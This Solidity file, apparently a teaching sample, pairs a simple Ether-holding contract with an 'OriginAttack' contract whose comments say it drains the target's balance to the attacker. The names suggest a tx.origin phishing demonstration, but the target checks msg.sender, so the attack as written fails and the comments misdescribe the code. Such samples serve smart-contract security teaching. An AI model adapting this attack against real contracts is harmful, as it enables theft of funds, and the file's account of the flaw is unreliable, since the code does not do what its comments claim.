// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title OriginContract
/// @notice A contract that allows the owner to transfer Ether to another address.
contract OriginContract {
    address public owner;

    /// @notice Constructs the OriginContract and sets the owner as the deployer of the contract.
    constructor() payable {
        owner = msg.sender;
    }

    /// @notice Transfers Ether from the contract to a specified address.
    /// @param _to The address to transfer Ether to.
    /// @param _amount The amount of Ether to transfer.
    function transfer(address payable _to, uint _amount) public {
        require(msg.sender == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

/// @title OriginAttack
/// @notice A contract representing an attack on the OriginContract by trying to transfer the contract's balance to the attacker's address.
contract OriginAttack {
    address payable public owner;
    OriginContract target;

    /// @notice Constructs the OriginAttack contract, specifying the address of the target OriginContract.
    /// @param _target The address of the OriginContract to attack.
    constructor(OriginContract _target) {
        target = OriginContract(_target);
        owner = payable(msg.sender);
    }

    /// @notice Initiates the attack by calling the transfer function of the target contract to transfer the contract's balance to the attacker's address.
    function attack() public {
        target.transfer(owner, address(target).balance);
    }
}
